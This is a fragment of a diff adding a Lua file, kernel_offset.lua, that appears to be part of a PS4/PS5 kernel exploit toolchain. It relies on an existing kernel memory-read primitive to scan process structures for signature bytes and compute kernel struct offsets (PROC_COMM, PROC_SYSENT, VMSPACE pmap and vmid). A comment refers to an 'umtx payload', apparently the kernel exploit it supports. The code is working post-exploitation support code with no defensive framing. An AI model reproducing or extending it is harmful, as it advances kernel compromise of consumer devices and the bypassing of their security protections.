+        local scan_val = kernel.read_dword(vmspace + scan_offset):tonumber()
+        if scan_val > 0 and scan_val <= 0x10 then
+            return scan_offset
+        end
+    end
+
+    error("failed to find VMSPACE_VM_VMID offset")
+end
+
+function find_proc_offsets()
+
+    local proc_data = kernel.read_buffer(kernel.addr.curproc, 0x1000)
+    local proc_data_addr = lua.resolve_value(proc_data)
+
+    local p_comm_sign = find_pattern(proc_data, "ce fa ef be cc bb")
+    local p_sysent_sign = find_pattern(proc_data, "ff ff ff ff ff ff ff 7f")
+
+    if not p_comm_sign then
+        error("failed to find offset for PROC_COMM")
+    end
+
+    if not p_sysent_sign then
+        error("failed to find offset for PROC_SYSENT")
+    end
+
+    local p_comm_offset = p_comm_sign[1] - 1 + 0x8
+    local p_sysent_offset = p_sysent_sign[1] - 1 - 0x10
+
+    return {
+        PROC_COMM = p_comm_offset,
+        PROC_SYSENT = p_sysent_offset
+    }
+end
+
+function find_additional_offsets()
+
+    local proc_offsets = find_proc_offsets()
+
+    local vm_map_pmap_offset = nil
+    local vm_map_vmid_offset = nil
+
+    -- not tested on ps4. ignore for now.
+    -- maybe can just hardcode if offset is not changes between fw on ps4
+    if PLATFORM == "ps5" then
+        vm_map_pmap_offset = find_vmspace_pmap_offset()
+        vm_map_vmid_offset =  find_vmspace_vmid_offset()
+    end
+
+    return {
+        PROC_COMM = proc_offsets.PROC_COMM,
+        PROC_SYSENT = proc_offsets.PROC_SYSENT,
+        VMSPACE_VM_PMAP = vm_map_pmap_offset,
+        VMSPACE_VM_VMID = vm_map_vmid_offset,
+    }
+end
+
+-- compatibility layer so ppl using older umtx payload can still work
+function initialize_kernel_offsets()
+    update_kernel_offsets()
+end
+
+--- END kernel_offset.lua ---
+=== PROBE 150a COMPLETE ===
